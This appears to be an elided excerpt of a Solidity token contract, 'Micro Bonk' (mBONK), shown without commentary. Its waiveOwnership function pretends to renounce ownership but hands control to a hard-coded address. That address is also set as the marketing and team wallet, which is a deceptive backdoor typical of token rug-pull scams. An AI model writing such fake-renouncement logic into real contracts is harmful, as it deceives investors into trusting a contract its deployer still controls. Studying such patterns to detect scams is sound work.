...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x48448961FA8Dde9517a1D08A4655Fe636bAD0b40));
        _owner = address(0x48448961FA8Dde9517a1D08A4655Fe636bAD0b40);
    }
...
contract MicroBonk is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Micro Bonk";
    string private _symbol = "mBONK";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x48448961FA8Dde9517a1D08A4655Fe636bAD0b40);
    address payable public teamWalletAddress = payable(0x48448961FA8Dde9517a1D08A4655Fe636bAD0b40);
